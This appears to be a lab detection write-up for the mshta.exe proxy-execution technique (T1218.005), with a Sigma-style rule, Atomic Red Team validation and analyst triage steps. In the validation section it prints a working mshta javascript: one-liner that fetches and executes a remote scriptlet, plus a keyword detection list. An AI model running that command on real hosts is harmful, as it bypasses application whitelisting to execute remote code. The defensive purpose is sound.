# T1218.005 — Mshta Proxy Execution

## Hypothesis
Adversaries abusing `mshta.exe` (Microsoft HTML Application host) to execute remote `.hta` payloads or inline `vbscript:` / `javascript:` schemes that fetch and execute remote scriptlets. `mshta.exe` is a signed Microsoft binary trusted by application whitelisting and is the canonical living-off-the-land primitive for proxy-execution of VBScript and JScript without writing a `.vbs` or `.js` file to disk.

## Threat actor context
Used by: APT32, Cobalt Strike default beacon, HTA-based phishing kits, deep-sea phishing campaigns, and most commodity loaders. The `mshta.exe javascript:` scheme pattern is one of the top 5 proxy-execution techniques observed in real-world phishing and remains a default in Cobalt Strike's "browser pivot" payload set.

## Telemetry required
- **Sysmon EventID 1** (ProcessCreate)
- `Image` ending with `\mshta.exe`
- `CommandLine` containing at least one indicator of remote execution:
  `http` (remote URL), `.hta` (HTA reference), `vbscript:`,
  `javascript:` (inline scheme)

## Why standard detection misses this
`mshta.exe` is a legitimate Microsoft binary that opens local `.hta`
files for enterprise line-of-business applications. Endpoint protection
typically allows its execution. The signal that distinguishes malicious
use from legitimate use is the CommandLine content — specifically,
whether the argument is a local file path or a remote URL / inline
scripting scheme. Basic loggers that only record the binary name cannot
distinguish the two.

## Detection logic
```yaml
detection:
  selection:
    Image|endswith: '\mshta.exe'
    CommandLine|contains:
      - 'http'
      - '.hta'
      - 'vbscript'
      - 'javascript'

  condition: selection
```

## Lab validation
- ART Test: `Invoke-AtomicTest T1218.005 -TestNumbers 1`
- ART Test Name: Mshta executes JavaScript Scheme Fetch Remote Payload
- Alert fired: Yes — Sysmon EID 1
- **Wazuh Hit Count: 2** — the ART test ran twice (initial run plus
  cleanup-validation re-run, both captured in Wazuh)
- CommandLine observed:
  `mshta.exe javascript:a=(GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/mshta.sct')).Exec();close();`
- The full remote URL is visible in the CommandLine confirming live
  payload fetch via the JavaScript scheme — a classic application
  whitelisting bypass

## Filter rationale
No filter applied — `mshta.exe` serving as a remote fetcher via
`javascript:` or `vbscript:` schemes has no legitimate use case in
modern Windows environments. Legitimate HTA applications are run as
local `.hta` files via direct path arguments (no `http`, no inline
scheme), and these invocations are not common enough to require
filtering. The signal in the CommandLine keywords is sufficiently
specific that additional filtering would only reduce coverage of an
extremely high-prevalence technique.

## Analyst triage guidance
On alert, check the `CommandLine` in Wazuh:
- If the CommandLine contains an `http://` or `https://` URL — confirmed
  remote payload fetch, escalate immediately and isolate the host
- If the CommandLine contains `javascript:` or `vbscript:` followed by
  `GetObject('script:...')` — inline scheme execution, escalate
- A local `.hta` file path (`mshta.exe C:\Program Files\App\help.hta`)
  may be legitimate — review the path and the signing status of the
  HTA file before closing
- Cross-reference with EID 3 (network connection) immediately before
  the alert — outbound HTTPS to a non-corporate domain is the
  confirming indicator
